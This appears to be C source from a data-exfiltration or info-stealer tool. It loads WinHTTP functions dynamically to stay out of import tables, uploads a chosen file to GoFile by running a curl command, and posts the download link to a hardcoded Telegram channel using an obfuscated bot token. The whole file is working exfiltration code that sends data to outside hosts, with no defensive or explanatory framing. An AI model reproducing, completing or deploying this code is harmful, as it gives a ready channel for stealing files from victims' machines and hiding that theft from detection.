#include "./../../include/global.h"
#include "./../../include/network.h"
#include "./../../include/crypto.h"

char EncodedToken[] = "PLACE_HOLDER";






int HTTP_POST(char *response, WCHAR *domain, WCHAR *path, char *body, WCHAR *wsAdditionalHeaders) {
    // Dynamically load the winhttp.dll library using LoadLib().
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"winhttp.dll";
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID hWinHTTP = NULL;
    NTSTATUS status = LoadLib(NULL, &dllCharacteristics, &dllName, &hWinHTTP);
    if (!NT_SUCCESS(status)) { return 1; }

    // Get function pointer addresses.
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "WinHttpOpen";
    procName1.Length = (USHORT)strlen(procNameBuffer1);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer1;
    PVOID WinHttpOpenProcAddress = NULL;
    NTSTATUS STATUS1 = GetProcAdd(hWinHTTP, &procName1, 0, &WinHttpOpenProcAddress);
    if (!NT_SUCCESS(STATUS1) || WinHttpOpenProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpOpenFunc pWinHttpOpen = (WinHttpOpenFunc)WinHttpOpenProcAddress;

    ANSI_STRING procName2;
    CHAR procNameBuffer2[] = "WinHttpConnect";
    procName2.Length = (USHORT)strlen(procNameBuffer2);
    procName2.MaximumLength = procName2.Length + 1;
    procName2.Buffer = procNameBuffer2;
    PVOID WinHttpConnectProcAddress = NULL;
    NTSTATUS STATUS2 = GetProcAdd(hWinHTTP, &procName2, 0, &WinHttpConnectProcAddress);
    if (!NT_SUCCESS(STATUS2) || WinHttpConnectProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpConnectFunc pWinHttpConnect = (WinHttpConnectFunc)WinHttpConnectProcAddress;

    ANSI_STRING procName3;
    CHAR procNameBuffer3[] = "WinHttpOpenRequest";
    procName3.Length = (USHORT)strlen(procNameBuffer3);
    procName3.MaximumLength = procName3.Length + 1;
    procName3.Buffer = procNameBuffer3;
    PVOID WinHttpOpenRequestProcAddress = NULL;
    NTSTATUS STATUS3 = GetProcAdd(hWinHTTP, &procName3, 0, &WinHttpOpenRequestProcAddress);
    if (!NT_SUCCESS(STATUS3) || WinHttpOpenRequestProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpOpenRequestFunc pWinHttpOpenRequest = (WinHttpOpenRequestFunc)WinHttpOpenRequestProcAddress;

    ANSI_STRING procName4;
    CHAR procNameBuffer4[] = "WinHttpSendRequest";
    procName4.Length = (USHORT)strlen(procNameBuffer4);
    procName4.MaximumLength = procName4.Length + 1;
    procName4.Buffer = procNameBuffer4;
    PVOID WinHttpSendRequestProcAddress = NULL;
    NTSTATUS STATUS4 = GetProcAdd(hWinHTTP, &procName4, 0, &WinHttpSendRequestProcAddress);
    if (!NT_SUCCESS(STATUS4) || WinHttpSendRequestProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpSendRequestFunc pWinHttpSendRequest = (WinHttpSendRequestFunc)WinHttpSendRequestProcAddress;

    ANSI_STRING procName5;
    CHAR procNameBuffer5[] = "WinHttpReceiveResponse";
    procName5.Length = (USHORT)strlen(procNameBuffer5);
    procName5.MaximumLength = procName5.Length + 1;
    procName5.Buffer = procNameBuffer5;
    PVOID WinHttpReceiveResponseProcAddress = NULL;
    NTSTATUS STATUS5 = GetProcAdd(hWinHTTP, &procName5, 0, &WinHttpReceiveResponseProcAddress);
    if (!NT_SUCCESS(STATUS5) || WinHttpReceiveResponseProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpReceiveResponseFunc pWinHttpReceiveResponse = (WinHttpReceiveResponseFunc)WinHttpReceiveResponseProcAddress;

    ANSI_STRING procName6;
    CHAR procNameBuffer6[] = "WinHttpReadData";
    procName6.Length = (USHORT)strlen(procNameBuffer6);
    procName6.MaximumLength = procName6.Length + 1;
    procName6.Buffer = procNameBuffer6;
    PVOID WinHttpReadDataProcAddress = NULL;
    NTSTATUS STATUS6 = GetProcAdd(hWinHTTP, &procName6, 0, &WinHttpReadDataProcAddress);
    if (!NT_SUCCESS(STATUS6) || WinHttpReadDataProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpReadDataFunc pWinHttpReadData = (WinHttpReadDataFunc)WinHttpReadDataProcAddress;

    ANSI_STRING procName7;
    CHAR procNameBuffer7[] = "WinHttpCloseHandle";
    procName7.Length = (USHORT)strlen(procNameBuffer7);
    procName7.MaximumLength = procName7.Length + 1;
    procName7.Buffer = procNameBuffer7;
    PVOID WinHttpCloseHandleProcAddress = NULL;
    NTSTATUS STATUS7 = GetProcAdd(hWinHTTP, &procName7, 0, &WinHttpCloseHandleProcAddress);
    if (!NT_SUCCESS(STATUS7) || WinHttpCloseHandleProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpCloseHandleFunc pWinHttpCloseHandle = (WinHttpCloseHandleFunc)WinHttpCloseHandleProcAddress;

    ANSI_STRING procName8;
    CHAR procNameBuffer8[] = "WinHttpQueryHeaders";
    procName8.Length = (USHORT)strlen(procNameBuffer8);
    procName8.MaximumLength = procName8.Length + 1;
    procName8.Buffer = procNameBuffer8;
    PVOID WinHttpQueryHeadersProcAddress = NULL;
    NTSTATUS STATUS8 = GetProcAdd(hWinHTTP, &procName8, 0, &WinHttpQueryHeadersProcAddress);
    if (!NT_SUCCESS(STATUS8) || WinHttpQueryHeadersProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpQueryHeadersFunc pWinHttpQueryHeaders = (WinHttpQueryHeadersFunc)WinHttpQueryHeadersProcAddress;

    ANSI_STRING procName9;
    CHAR procNameBuffer9[] = "WinHttpQueryDataAvailable";
    procName9.Length = (USHORT)strlen(procNameBuffer9);
    procName9.MaximumLength = procName9.Length + 1;
    procName9.Buffer = procNameBuffer9;
    PVOID WinHttpQueryDataAvailableProcAddress = NULL;
    NTSTATUS STATUS9 = GetProcAdd(hWinHTTP, &procName9, 0, &WinHttpQueryDataAvailableProcAddress);
    if (!NT_SUCCESS(STATUS9) || WinHttpQueryDataAvailableProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpQueryDataAvailableFunc pWinHttpQueryDataAvailable = (WinHttpQueryDataAvailableFunc)WinHttpQueryDataAvailableProcAddress;

    ANSI_STRING procName10;
    CHAR procNameBuffer10[] = "WinHttpAddRequestHeaders";
    procName10.Length = (USHORT)strlen(procNameBuffer10);
    procName10.MaximumLength = procName10.Length + 1;
    procName10.Buffer = procNameBuffer10;
    PVOID WinHttpAddRequestHeadersProcAddress = NULL;
    NTSTATUS STATUS10 = GetProcAdd(hWinHTTP, &procName10, 0, &WinHttpAddRequestHeadersProcAddress);
    if (!NT_SUCCESS(STATUS10) || WinHttpAddRequestHeadersProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpAddRequestHeadersFunc pWinHttpAddRequestHeaders = (WinHttpAddRequestHeadersFunc)WinHttpAddRequestHeadersProcAddress;

    // Open a session and connect to the server.
    HINTERNET hSession = pWinHttpOpen(NULL, 0, 0, 0, 0);
    HINTERNET hConnect = pWinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { 
        pWinHttpCloseHandle(hSession); 
        return 1; 
    }

    // Open the HTTP request.
    HINTERNET hRequest = pWinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return 1;
    }

    // Set headers.
    BOOL setContentType = pWinHttpAddRequestHeaders(hRequest, wsAdditionalHeaders, wcslen(wsAdditionalHeaders), WINHTTP_ADDREQ_FLAG_ADD);

    // Get body length.
    DWORD bodyLength = strlen(body);

    // Send the request with the body.
    BOOL bResults = pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body, bodyLength, bodyLength, 0);
    if (!bResults) {
        pWinHttpCloseHandle(hRequest);
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return 1;
    }

    // Receive the response.
    bResults = pWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        pWinHttpCloseHandle(hRequest);
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return 1;
    }

    // Query status code.
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    pWinHttpQueryHeaders(hRequest, 19 | 0x20000000, 0, &dwStatusCode, &dwSize, 0);

    // Initialize variables for reading data.
    DWORD dwSizeAvailable = 0;
    DWORD dwDownloaded = 0;
    char *pszOutBuffer;
    size_t totalSize = 0;
    char *fullBinaryData = NULL;

    // Read the response body in chunks.
    do {
        dwSizeAvailable = 0;
        if (!pWinHttpQueryDataAvailable(hRequest, &dwSizeAvailable)) { break; }
        if (dwSizeAvailable == 0) { break; }

        // Allocate buffer.
        pszOutBuffer = (char*)malloc(dwSizeAvailable + 1);
        if (!pszOutBuffer) { break; }
        ZeroMemory(pszOutBuffer, dwSizeAvailable + 1);

        // Read data into buffer.
        if (!pWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSizeAvailable, &dwDownloaded)) {
            free(pszOutBuffer);
            break;
        } else {
            // Reallocate memory for the full response.
            char* temp = (char*)realloc(fullBinaryData, totalSize + dwDownloaded);
            if (temp == NULL) {
                free(fullBinaryData);
                free(pszOutBuffer);
                break;
            }
            fullBinaryData = temp;
            memcpy(fullBinaryData + totalSize, pszOutBuffer, dwDownloaded);
            totalSize += dwDownloaded;
            free(pszOutBuffer);
        }
    } while (dwSizeAvailable > 0);

    // Copy response data to the output parameter if data was received.
    if (fullBinaryData) {
        strcpy(response, fullBinaryData);
        response[totalSize] = '\0';
        free(fullBinaryData);
    }

    // Cleanup handles.
    pWinHttpCloseHandle(hRequest);
    pWinHttpCloseHandle(hConnect);
    pWinHttpCloseHandle(hSession);
    UnloadLib(hWinHTTP);
    
    return 0;
}

int HTTP_GET(char *response, WCHAR *domain, WCHAR *path) {
    // Dynamically load the winhttp.dll library using LoadLib().
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"winhttp.dll";
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID hWinHTTP = NULL;
    NTSTATUS status = LoadLib(NULL, &dllCharacteristics, &dllName, &hWinHTTP);
    if (!NT_SUCCESS(status)) { return 1; }

    // Get function pointer addresses.
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "WinHttpOpen";
    procName1.Length = (USHORT)strlen(procNameBuffer1);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer1;
    PVOID WinHttpOpenProcAddress = NULL;
    NTSTATUS STATUS1 = GetProcAdd(hWinHTTP, &procName1, 0, &WinHttpOpenProcAddress);
    if (!NT_SUCCESS(STATUS1) || WinHttpOpenProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpOpenFunc pWinHttpOpen = (WinHttpOpenFunc)WinHttpOpenProcAddress;

    ANSI_STRING procName2;
    CHAR procNameBuffer2[] = "WinHttpConnect";
    procName2.Length = (USHORT)strlen(procNameBuffer2);
    procName2.MaximumLength = procName2.Length + 1;
    procName2.Buffer = procNameBuffer2;
    PVOID WinHttpConnectProcAddress = NULL;
    NTSTATUS STATUS2 = GetProcAdd(hWinHTTP, &procName2, 0, &WinHttpConnectProcAddress);
    if (!NT_SUCCESS(STATUS2) || WinHttpConnectProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpConnectFunc pWinHttpConnect = (WinHttpConnectFunc)WinHttpConnectProcAddress;

    ANSI_STRING procName3;
    CHAR procNameBuffer3[] = "WinHttpOpenRequest";
    procName3.Length = (USHORT)strlen(procNameBuffer3);
    procName3.MaximumLength = procName3.Length + 1;
    procName3.Buffer = procNameBuffer3;
    PVOID WinHttpOpenRequestProcAddress = NULL;
    NTSTATUS STATUS3 = GetProcAdd(hWinHTTP, &procName3, 0, &WinHttpOpenRequestProcAddress);
    if (!NT_SUCCESS(STATUS3) || WinHttpOpenRequestProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpOpenRequestFunc pWinHttpOpenRequest = (WinHttpOpenRequestFunc)WinHttpOpenRequestProcAddress;

    ANSI_STRING procName4;
    CHAR procNameBuffer4[] = "WinHttpSendRequest";
    procName4.Length = (USHORT)strlen(procNameBuffer4);
    procName4.MaximumLength = procName4.Length + 1;
    procName4.Buffer = procNameBuffer4;
    PVOID WinHttpSendRequestProcAddress = NULL;
    NTSTATUS STATUS4 = GetProcAdd(hWinHTTP, &procName4, 0, &WinHttpSendRequestProcAddress);
    if (!NT_SUCCESS(STATUS4) || WinHttpSendRequestProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpSendRequestFunc pWinHttpSendRequest = (WinHttpSendRequestFunc)WinHttpSendRequestProcAddress;

    ANSI_STRING procName5;
    CHAR procNameBuffer5[] = "WinHttpReceiveResponse";
    procName5.Length = (USHORT)strlen(procNameBuffer5);
    procName5.MaximumLength = procName5.Length + 1;
    procName5.Buffer = procNameBuffer5;
    PVOID WinHttpReceiveResponseProcAddress = NULL;
    NTSTATUS STATUS5 = GetProcAdd(hWinHTTP, &procName5, 0, &WinHttpReceiveResponseProcAddress);
    if (!NT_SUCCESS(STATUS5) || WinHttpReceiveResponseProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpReceiveResponseFunc pWinHttpReceiveResponse = (WinHttpReceiveResponseFunc)WinHttpReceiveResponseProcAddress;

    ANSI_STRING procName6;
    CHAR procNameBuffer6[] = "WinHttpReadData";
    procName6.Length = (USHORT)strlen(procNameBuffer6);
    procName6.MaximumLength = procName6.Length + 1;
    procName6.Buffer = procNameBuffer6;
    PVOID WinHttpReadDataProcAddress = NULL;
    NTSTATUS STATUS6 = GetProcAdd(hWinHTTP, &procName6, 0, &WinHttpReadDataProcAddress);
    if (!NT_SUCCESS(STATUS6) || WinHttpReadDataProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpReadDataFunc pWinHttpReadData = (WinHttpReadDataFunc)WinHttpReadDataProcAddress;

    ANSI_STRING procName7;
    CHAR procNameBuffer7[] = "WinHttpCloseHandle";
    procName7.Length = (USHORT)strlen(procNameBuffer7);
    procName7.MaximumLength = procName7.Length + 1;
    procName7.Buffer = procNameBuffer7;
    PVOID WinHttpCloseHandleProcAddress = NULL;
    NTSTATUS STATUS7 = GetProcAdd(hWinHTTP, &procName7, 0, &WinHttpCloseHandleProcAddress);
    if (!NT_SUCCESS(STATUS7) || WinHttpCloseHandleProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpCloseHandleFunc pWinHttpCloseHandle = (WinHttpCloseHandleFunc)WinHttpCloseHandleProcAddress;

    ANSI_STRING procName8;
    CHAR procNameBuffer8[] = "WinHttpQueryHeaders";
    procName8.Length = (USHORT)strlen(procNameBuffer8);
    procName8.MaximumLength = procName8.Length + 1;
    procName8.Buffer = procNameBuffer8;
    PVOID WinHttpQueryHeadersProcAddress = NULL;
    NTSTATUS STATUS8 = GetProcAdd(hWinHTTP, &procName8, 0, &WinHttpQueryHeadersProcAddress);
    if (!NT_SUCCESS(STATUS8) || WinHttpQueryHeadersProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpQueryHeadersFunc pWinHttpQueryHeaders = (WinHttpQueryHeadersFunc)WinHttpQueryHeadersProcAddress;

    ANSI_STRING procName9;
    CHAR procNameBuffer9[] = "WinHttpQueryDataAvailable";
    procName9.Length = (USHORT)strlen(procNameBuffer9);
    procName9.MaximumLength = procName9.Length + 1;
    procName9.Buffer = procNameBuffer9;
    PVOID WinHttpQueryDataAvailableProcAddress = NULL;
    NTSTATUS STATUS9 = GetProcAdd(hWinHTTP, &procName9, 0, &WinHttpQueryDataAvailableProcAddress);
    if (!NT_SUCCESS(STATUS9) || WinHttpQueryDataAvailableProcAddress == NULL) { UnloadLib(hWinHTTP); return -1; }
    WinHttpQueryDataAvailableFunc pWinHttpQueryDataAvailable = (WinHttpQueryDataAvailableFunc)WinHttpQueryDataAvailableProcAddress;

    
    HINTERNET hSession = pWinHttpOpen(NULL, 0, 0, 0, 0);
    HINTERNET hConnect = pWinHttpConnect(hSession, domain, 80, 0);
    if (!hConnect) { pWinHttpCloseHandle(hSession); return 1; }
    HINTERNET hRequest = pWinHttpOpenRequest(hConnect, L"GET", path, NULL, 0, 0, 0);
    if (!hRequest) { pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); return 1; }
    BOOL bResults = pWinHttpSendRequest(hRequest, 0, 0, 0, 0, 0, 0);
    if (!bResults) { pWinHttpCloseHandle(hRequest); pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); return 1; }
    bResults = pWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) { pWinHttpCloseHandle(hRequest); pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); return 1; }
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    pWinHttpQueryHeaders(hRequest, 19 | 0x20000000, 0, &dwStatusCode, &dwSize, 0);
    DWORD dwSizeAvailable = 0;
    DWORD dwDownloaded = 0;
    char* pszOutBuffer;
    size_t totalSize = 0;
    char* fullBinaryData = NULL;
    do
    {
        dwSizeAvailable = 0;
        if (!pWinHttpQueryDataAvailable(hRequest, &dwSizeAvailable)) { break; }
        if (dwSizeAvailable == 0) { break; }
        pszOutBuffer = (char*)malloc(dwSizeAvailable + 1);
        if (!pszOutBuffer) { break; }
        ZeroMemory(pszOutBuffer, dwSizeAvailable + 1);
        if (!pWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSizeAvailable, &dwDownloaded)) { free(pszOutBuffer); break; }
        else
        {
            char* temp = (char*)realloc(fullBinaryData, totalSize + dwDownloaded);
            if (temp == NULL) {
                free(fullBinaryData);
                free(pszOutBuffer);
                break;
            }
            fullBinaryData = temp;
            memcpy(fullBinaryData + totalSize, pszOutBuffer, dwDownloaded);
            totalSize += dwDownloaded;
            free(pszOutBuffer);
        }
    } while (dwSizeAvailable > 0);
    if (fullBinaryData) {
        strcpy(response, fullBinaryData);
        free(fullBinaryData);
    }
    pWinHttpCloseHandle(hRequest);
    pWinHttpCloseHandle(hConnect);
    pWinHttpCloseHandle(hSession);
    UnloadLib(hWinHTTP);
}

int GetGoFileServer(char *Server) {
    int Found = 0;
    char *pfound;
    char ServerOut[1024];
    HTTP_GET(ServerOut, L"api.gofile.io", L"/servers");
    pfound = strstr(ServerOut, "\"name\":\"");
    if (pfound == NULL) { WARN("Substring ' \"name\":\" ' not found!\n"); return 1; }
    char *Start = pfound + strlen("\"name\":\"");
    char *pfound2 = strstr(Start, "\"");
    if (pfound2 == NULL) { WARN("Closing quote not found!\n"); return 1; }
    int nameLength = pfound2 - Start;
    strncpy(Server, Start, nameLength);
    Server[nameLength] = '\0';
    return 0;
}

int UploadGoFile(char* pLink, char* FileToUpload, char* BestServer) {
    // Use popen to upload the file to GoFile using curl.
    char UploadCommand[512];
    char UploadOutput[1024];
    sprintf(UploadCommand, "curl -X POST --silent -F file=@\"%s\" https://%s.gofile.io/contents/uploadfile", FileToUpload, BestServer);
    INFO("Executing Command: %s", UploadCommand);
    FILE *fp1 = popen(UploadCommand, "r");
    fgets(UploadOutput, sizeof(UploadOutput), fp1);
    pclose(fp1);

    // Parse the link from the JSON.
    int Found = 0;
    char *pfound;
    pfound = strstr(UploadOutput, "downloadPage\":\"");
    if (pfound == NULL) { WARN("Upload Failed!\n"); return 1; }
    char *Start = pfound + strlen("downloadPage\":\"");
    char *End = strstr(Start, "\"");
    if (End == NULL) { WARN("Closing quote not found!\n"); return 1; }
    int linkLength = End - Start;
    strncpy(pLink, Start, linkLength);
    pLink[linkLength] = '\0';
    return 0;
}

int SendTelegram(char* Link) {
    INFO("Sending the link to your chosen channel with the bot...");

    // Decode token
    INFO("Decoding BizFum-Encoded Telegram token: %s.", EncodedToken);
    char* DecodedToken = BizFumEncodingDecode(EncodedToken);
    OKAY("Got decoded Telegram bot token --> %s\n", DecodedToken);

    // Construct body
    char Body[400];
    char Channel_ID[] = "-1002413724719";
    sprintf(Body, "{\"chat_id\":%s, \"text\":\"Another dawn, another dream to embark it. \\n\\nLink: %s\"}", Channel_ID, Link);

    char ResponseSend[300]; // Store response

    // Construct headers
    WCHAR wsAdditionalHeaders[1024] = L"Content-Type: application/json\r\n";

    // Construct path
    wchar_t TGPath[200];
    swprintf(TGPath, 200, L"/bot%s/sendMessage", DecodedToken);
    
    // Call the HTTP_POST function
    int result = HTTP_POST(ResponseSend, L"api.telegram.org", TGPath, Body, wsAdditionalHeaders);
    
    INFO("Body: %s", Body);
    INFO("Response: %s\n", ResponseSend);

    if ( strstr(ResponseSend, "\"ok\":true") != NULL ) {
        OKAY("Sent download link to the Telegram channel!");
    } else {
        WARN("Error in sending download link to the Telegram channel!");
    }

    

    return result;
}
